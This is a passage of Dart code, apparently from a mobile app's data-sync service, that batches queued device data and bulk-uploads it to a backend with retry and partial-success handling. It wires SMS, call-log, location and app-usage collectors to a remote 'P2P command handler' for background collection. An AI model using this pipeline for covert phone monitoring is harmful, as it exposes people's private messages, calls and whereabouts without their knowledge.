      final preparedRequest = _prepareBulkCollectRequest(request);
      if (preparedRequest.batches.isEmpty) {
        return <String, Set<int>>{};
      }

      final dataBatches = preparedRequest.batches.map((batch) {
        return {
          'data_type': _mapApiDataType(batch.dataType),
          'items': batch.items,
          'metadata': {
            'collection_method': 'background',
            'batch_size': batch.itemCount,
            'priority': _syncPriorities[batch.dataType] ?? 3,
            'compression_used': true,
          }
        };
      }).toList(growable: false);

      final response = await _apiClient.post(
        '/data/collect/bulk/',
        data: {
          'device_id': deviceId,
          'data_batches': dataBatches,
          'metadata': {
            'sync_timestamp': DateTime.now().toUtc().toIso8601String(),
            'battery_level': batteryLevel,
            'network_type': await _getNetworkType(),
            'app_version': '1.0.0',
            'total_batches': dataBatches.length,
            'total_items': preparedRequest.totalItems,
            'optimization_used': true,
          }
        },
      );

      if (!_isSuccessfulCollectStatusCode(response.statusCode)) {
        if (response.statusCode == 413) {
          return _retrySplitBulkCollectRequest(
            deviceId,
            batteryLevel,
            request,
            limits,
            splitAttempt: splitAttempt,
          );
        }

        return null;
      }

      return _extractSuccessfulBulkIndexes(response.data, preparedRequest);
    } on DioException catch (e) {
      final statusCode = e.response?.statusCode;
      if (statusCode == 413) {
        return _retrySplitBulkCollectRequest(
          deviceId,
          batteryLevel,
          request,
          limits,
          splitAttempt: splitAttempt,
        );
      }

      if (!_isRetryableStatusCode(statusCode)) {
        throw NonRetryableSyncException(
          'Non-retryable bulk sync error: HTTP ${statusCode ?? 'unknown'}',
        );
      }

      debugPrint('Retryable bulk sync error: HTTP ${statusCode ?? 'unknown'}');
      return null;
    }
  }

  Future<Map<String, Set<int>>?> _retrySplitBulkCollectRequest(
    String deviceId,
    int batteryLevel,
    BulkCollectRequest<dynamic> request,
    BulkCollectLimits limits, {
    required int splitAttempt,
  }) async {
    if (splitAttempt >= _maxBulkCollectSplitAttempts ||
        request.totalItems <= 1) {
      debugPrint('Bulk sync payload still too large after bounded re-chunking');
      return null;
    }

    final reducedLimits = limits.reducedForRetry();
    final retryBulkLimit = (request.totalItems ~/ 2)
        .clamp(1, reducedLimits.maxItemsPerBulk)
        .toInt();
    final retryLimits = BulkCollectLimits(
      maxItemsPerBulk: retryBulkLimit,
      maxItemsPerDataType: reducedLimits.maxItemsPerDataType,
    );
    final retryRequests = BulkCollectPlanner.packBatches<dynamic>(
      request.batches
          .expand((batch) => batch.split(retryLimits.maxItemsPerBatch)),
      limits: retryLimits,
    );

    final delay = Duration(milliseconds: 250 * (splitAttempt + 1));
    await Future.delayed(delay);

    final syncedIndexesByType = <String, Set<int>>{};
    for (final retryRequest in retryRequests) {
      final retryResult = await _sendBulkCollectRequest(
        deviceId,
        batteryLevel,
        retryRequest,
        retryLimits,
        splitAttempt: splitAttempt + 1,
      );

      if (retryResult == null) {
        return syncedIndexesByType.isEmpty ? null : syncedIndexesByType;
      }

      _mergeSyncedBulkIndexes(syncedIndexesByType, retryResult);
    }

    return syncedIndexesByType;
  }

  BulkCollectRequest<dynamic> _prepareBulkCollectRequest(
    BulkCollectRequest<dynamic> request,
  ) {
    final preparedBatches = <BulkCollectBatch<dynamic>>[];

    for (final batch in request.batches) {
      final preparedItems = <dynamic>[];
      final sourceIndexes = <int>[];

      for (var index = 0; index < batch.items.length; index++) {
        final cleanItem =
            _prepareItemForCollectApi(batch.dataType, batch.items[index]);
        if (cleanItem == null) continue;

        preparedItems.add(cleanItem);
        sourceIndexes.add(batch.sourceIndexes[index]);
      }

      if (preparedItems.isEmpty) continue;

      preparedBatches.add(
        BulkCollectBatch<dynamic>(
          dataType: batch.dataType,
          items: preparedItems,
          sourceIndexes: sourceIndexes,
        ),
      );
    }

    return BulkCollectRequest<dynamic>(batches: preparedBatches);
  }

  Map<String, Set<int>> _extractSuccessfulBulkIndexes(
    dynamic responseData,
    BulkCollectRequest<dynamic> request,
  ) {
    final successfulIndexes = <String, Set<int>>{};
    if (responseData is! Map<String, dynamic>) {
      return successfulIndexes;
    }

    final results = responseData['results'];
    if (results is! List) {
      return successfulIndexes;
    }

    final batchesByApiDataType = <String, BulkCollectBatch<dynamic>>{};
    for (final batch in request.batches) {
      batchesByApiDataType[_mapApiDataType(batch.dataType)] = batch;
    }

    for (final entry in results) {
      if (entry is! Map<String, dynamic>) continue;

      final dataType = entry['data_type'];
      final result = entry['result'];
      if (dataType is! String || result is! Map<String, dynamic>) continue;

      final batch = batchesByApiDataType[dataType];
      if (batch == null) {
        debugPrint('Bulk sync response referenced unknown type $dataType');
        continue;
      }

      final syncResult = _parseSuccessfulCollectResponse(
        result,
        batch.dataType,
        batch.sourceIndexes,
      );

      if (syncResult.hasSyncedItems) {
        successfulIndexes
            .putIfAbsent(batch.dataType, () => <int>{})
            .addAll(syncResult.syncedIndexes);
      }
    }

    return successfulIndexes;
  }

  void _mergeSyncedBulkIndexes(
    Map<String, Set<int>> target,
    Map<String, Set<int>> source,
  ) {
    for (final entry in source.entries) {
      target.putIfAbsent(entry.key, () => <int>{}).addAll(entry.value);
    }
  }

  // Track sync success metrics
  void _recordSyncSuccess(String dataType, int itemCount) {
    _syncSuccessCount[dataType] =
        (_syncSuccessCount[dataType] ?? 0) + itemCount;
    _lastSyncAttempt[dataType] = DateTime.now();
  }

  // Track sync failure metrics
  void _recordSyncFailure(String dataType) {
    _syncFailureCount[dataType] = (_syncFailureCount[dataType] ?? 0) + 1;
    _lastSyncAttempt[dataType] = DateTime.now();
  }

  // Calculate sync success rate for a data type
  double _getSyncSuccessRate(String dataType) {
    final successes = _syncSuccessCount[dataType] ?? 0;
    final failures = _syncFailureCount[dataType] ?? 0;

    if (successes + failures == 0)
      return 1.0; // Assume good until proven otherwise

    return successes / (successes + failures);
  }

  // Get comprehensive sync statistics
  Map<String, dynamic> getSyncStatistics() {
    final stats = <String, dynamic>{};

    for (final dataType in {
      ..._syncSuccessCount.keys,
      ..._syncFailureCount.keys
    }) {
      final successes = _syncSuccessCount[dataType] ?? 0;
      final failures = _syncFailureCount[dataType] ?? 0;
      final successRate = _getSyncSuccessRate(dataType);
      final queueSize = _syncQueue[dataType]?.length ?? 0;
      final priority = _syncPriorities[dataType] ?? 3;
      final lastAttempt = _lastSyncAttempt[dataType];

      stats[dataType] = {
        'queue_size': queueSize,
        'priority': priority,
        'success_count': successes,
        'failure_count': failures,
        'success_rate': successRate,
        'last_attempt': lastAttempt?.toIso8601String(),
      };
    }

    stats['_summary'] = {
      'total_queue_size': _getQueueSize(),
      'is_syncing': _isSyncing,
      'active_data_types': _syncQueue.keys.length,
    };

    return stats;
  }

  // Collector getters for P2P command handler
  LocationCollector get locationCollector => _locationCollector;
  SmsCollector get smsCollector => _smsCollector;
  CallsCollector get callsCollector => _callsCollector;
  AppsCollector get appsCollector => _appsCollector;

  // Collector status getters for P2P command handler
  bool get isLocationCollectorActive => _locationCollector.isCollecting;
  bool get isSmsCollectorActive => _smsCollector.isCollecting;
  bool get isCallsCollectorActive => _callsCollector.isCollecting;
  bool get isAppsCollectorActive => _appsCollector.isCollecting;
  bool get isMediaStoreCollectorActive => _mediaStoreCollector.isCollecting;

  // Perform maintenance and optimization
  Future<void> performMaintenanceOptimization() async {
    if (_isOptimizing) return;

    _isOptimizing = true;
    try {
      debugPrint('Starting sync optimization maintenance...');

      // Clean up old metrics (keep last 7 days)
      final cutoff = DateTime.now().subtract(const Duration(days: 7));

      // Reset metrics for data types that haven't synced recently
      final toReset = <String>[];
      for (final entry in _lastSyncAttempt.entries) {
        if (entry.value.isBefore(cutoff)) {
          toReset.add(entry.key);
        }
      }

      for (final dataType in toReset) {
        _syncSuccessCount.remove(dataType);
        _syncFailureCount.remove(dataType);
        _lastSyncAttempt.remove(dataType);
      }

      debugPrint(
          'Optimization maintenance completed. Reset metrics for ${toReset.length} data types');
    } finally {
      _isOptimizing = false;
    }
  }

  bool _isDuplicateQueuedItem(String dataType, dynamic candidate) {
    if (candidate is! Map<String, dynamic>) {
      return false;
    }

    final existingItems = _syncQueue[dataType];
    if (existingItems == null || existingItems.isEmpty) {
      return false;
    }

    final syncItemId = candidate['sync_item_id'];
    if (syncItemId != null) {
      return existingItems.any((item) {
        return item is Map<String, dynamic> &&
            item['sync_item_id'] == syncItemId;
      });
    }

    final encodedCandidate = jsonEncode(candidate);
    return existingItems.any((item) {
      return item is Map<String, dynamic> &&
          jsonEncode(item) == encodedCandidate;
    });
  }

  bool _isCollectApiDataType(String dataType) {
    return _collectApiDataTypes.contains(dataType);
  }

  bool _isSuccessfulCollectStatusCode(int? statusCode) {
    return statusCode == 200 || statusCode == 201 || statusCode == 207;
  }

  _BatchSyncResult _parseSuccessfulCollectResponse(
    dynamic responseData,
    String dataType,
    List<int> submittedOriginalIndexes,
  ) {
    if (submittedOriginalIndexes.isEmpty) {
      return const _BatchSyncResult();
    }

    if (responseData is! Map<String, dynamic>) {
      debugPrint('[DataCollector] Batch $dataType returned an invalid body');
      return const _BatchSyncResult();
    }

    final errorCount = _readIntValue(responseData, [
      'error_count',
      'failed_items',
      'failed_count',
    ]);
    final processedCount = _readOptionalIntValue(responseData, [
      'processed_count',
      'processed_items',
      'synced_count',
    ]);
    final success = responseData['success'] == true;
    final itemErrors = responseData['item_errors'];
    final failedSubmittedIndexes = _readFailedSubmittedIndexes(itemErrors);

    if (failedSubmittedIndexes.isNotEmpty && processedCount != null) {
      final syncedIndexes = <int>{};
      for (var submittedIndex = 0;
          submittedIndex < submittedOriginalIndexes.length;
          submittedIndex++) {
        if (!failedSubmittedIndexes.contains(submittedIndex)) {
          syncedIndexes.add(submittedOriginalIndexes[submittedIndex]);
        }
      }

      debugPrint(
        '[DataCollector] Batch $dataType partially synced '
        '${syncedIndexes.length}/${submittedOriginalIndexes.length} items',
      );
      _logCollectItemErrors(dataType, responseData);
      return _BatchSyncResult.synced(syncedIndexes);
    }

    if (success &&
        errorCount == 0 &&
        failedSubmittedIndexes.isEmpty &&
        (processedCount == null ||
            processedCount >= submittedOriginalIndexes.length)) {
      return _BatchSyncResult.synced(submittedOriginalIndexes.toSet());
    }

    if (success && errorCount == 0 && processedCount != null) {
      debugPrint(
        '[DataCollector] Batch $dataType reported $processedCount processed '
        'for ${submittedOriginalIndexes.length} submitted item(s)',
      );
      return const _BatchSyncResult();
    }

    if (responseData['error'] != null || errorCount > 0) {
      debugPrint(
        '[DataCollector] Batch $dataType rejected $errorCount item(s)',
      );
      _logCollectItemErrors(dataType, responseData);
      return const _BatchSyncResult.permanentFailure();
    }

    if (processedCount != null && processedCount <= 0) {
      debugPrint(
        '[DataCollector] Batch $dataType accepted HTTP but processed no items',
      );
      return const _BatchSyncResult();
    }

    debugPrint(
      '[DataCollector] Batch $dataType returned ambiguous collect status',
    );
    return const _BatchSyncResult();
  }

  int _readIntValue(Map<String, dynamic> data, List<String> keys) {
    return _readOptionalIntValue(data, keys) ?? 0;
  }

  int? _readOptionalIntValue(Map<String, dynamic> data, List<String> keys) {
    for (final key in keys) {
      final value = data[key];
      if (value is int) return value;
      if (value is num) return value.toInt();
      if (value is String) {
        final parsed = int.tryParse(value);
        if (parsed != null) return parsed;
      }
    }
    return null;
  }

  Set<int> _readFailedSubmittedIndexes(dynamic itemErrors) {
    if (itemErrors is! List) {
      return const <int>{};
    }

    final indexes = <int>{};
    for (final itemError in itemErrors) {
      if (itemError is! Map) continue;
      final index = itemError['index'];
      if (index is int) {
        indexes.add(index);
      } else if (index is num) {
        indexes.add(index.toInt());
      } else if (index is String) {
        final parsed = int.tryParse(index);
        if (parsed != null) indexes.add(parsed);
      }
    }
    return indexes;
  }

  void _logCollectItemErrors(String dataType, dynamic responseData) {
    if (responseData is! Map) {
      return;
    }

    final itemErrors = responseData['item_errors'];
    if (itemErrors is! List || itemErrors.isEmpty) {
      return;
    }

    final sanitized = itemErrors.take(5).map((itemError) {
      if (itemError is! Map) {
        return {'error': 'unknown'};
      }
      return {
        'index': itemError['index'],
        'reason': itemError['reason'] ?? itemError['error'],
      };
    }).toList(growable: false);
    debugPrint('[DataCollector] $dataType item errors: $sanitized');
  }

  _PreparedCollectBatch _prepareBatchForCollectApi(
    String dataType,
    List<dynamic> batch,
  ) {
    final cleanItems = <dynamic>[];
    final originalIndexes = <int>[];

    for (var index = 0; index < batch.length; index++) {
      final cleanItem = _prepareItemForCollectApi(dataType, batch[index]);
      if (cleanItem == null) continue;

      cleanItems.add(cleanItem);
      originalIndexes.add(index);
    }

    return _PreparedCollectBatch(
      items: cleanItems,
      originalIndexes: originalIndexes,
    );
  }

  Map<String, dynamic>? _prepareItemForCollectApi(
    String dataType,
    dynamic item,
  ) {
    if (item is! Map) {
      return null;
    }

    final cleanItem = Map<String, dynamic>.from(item);
    cleanItem.remove('device_id');
    cleanItem.remove('collector');
    cleanItem.remove('data_type');
    cleanItem.remove('sync_item_id');

    switch (dataType) {
      case 'location':
        cleanItem['recorded_at'] =
            _firstStringValue(cleanItem, ['recorded_at', 'collected_at']) ??
                DateTime.now().toUtc().toIso8601String();
        return cleanItem;
      case 'app_usage':
        final startTime = _firstStringValue(cleanItem, ['start_time']);
        if (startTime == null) {
          return null;
        }
        _truncateStringField(cleanItem, 'app_category');
        _truncateStringField(cleanItem, 'category');
        cleanItem['recorded_at'] =
            _firstStringValue(cleanItem, ['recorded_at', 'collected_at']) ??
                startTime;
        return cleanItem;
      case 'app_info':
        _truncateStringField(cleanItem, 'version_name');
        _truncateStringField(cleanItem, 'app_category');
        cleanItem['recorded_at'] =
            _firstStringValue(cleanItem, ['recorded_at', 'collected_at']) ??
                DateTime.now().toUtc().toIso8601String();
        return cleanItem;
      default:
        return cleanItem;
    }
  }

  void _truncateStringField(
    Map<String, dynamic> item,
    String key, {
    int maxLength = 255,
  }) {
    final value = item[key];
    if (value is! String || value.length <= maxLength) {
      return;
    }

    item[key] = value.substring(0, maxLength);
    debugPrint(
      '[DataCollector] Truncated $key from ${value.length} to $maxLength chars',
    );
  }

  String? _firstStringValue(Map<String, dynamic> item, List<String> keys) {
    for (final key in keys) {
      final value = item[key];
      if (value is String && value.isNotEmpty) {
        return value;
      }
    }
    return null;
  }

  Future<void> _markUnsupportedCollectTypeAsHandled(String dataType) async {
    final items = _syncQueue[dataType] ?? const <dynamic>[];
    final syncItems =
        items.whereType<Map<String, dynamic>>().toList(growable: false);

    try {
      final databaseService = locator<DatabaseService>();
      await databaseService.markItemsSynced(syncItems);
    } catch (e) {
      debugPrint('Error marking unsupported $dataType items as handled: $e');
    }

    _syncQueue.remove(dataType);
    _syncPriorities.remove(dataType);
    debugPrint(
      'Skipped $dataType sync: data type is not supported by /data/collect API',
    );
  }

  Future<String?> _resolveBackendDeviceIdForSync() async {
    final deviceService = locator<DeviceService>();
    final deviceId = await deviceService.getServerDeviceId();
    if (_isBackendUuid(deviceId)) {
      return deviceId;
    }

    debugPrint('Data sync blocked: unresolved backend device UUID ($deviceId)');
    return null;
  }

  Future<String?> _ensureValidBackendDeviceId(String? deviceId) async {
    if (_isBackendUuid(deviceId)) {
      return deviceId;
    }

    return _resolveBackendDeviceIdForSync();
  }

  bool _isBackendUuid(String? value) {
    if (value == null || value.isEmpty) {
      return false;
    }

    final uuidRegex = RegExp(
      r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$',
    );
    return uuidRegex.hasMatch(value);
  }

  bool _isRetryableStatusCode(int? statusCode) {
    if (statusCode == null) {
      return true;
    }

    if (statusCode >= 500) {
      return true;
    }

    return statusCode == 408 || statusCode == 409 || statusCode == 429;
  }
}
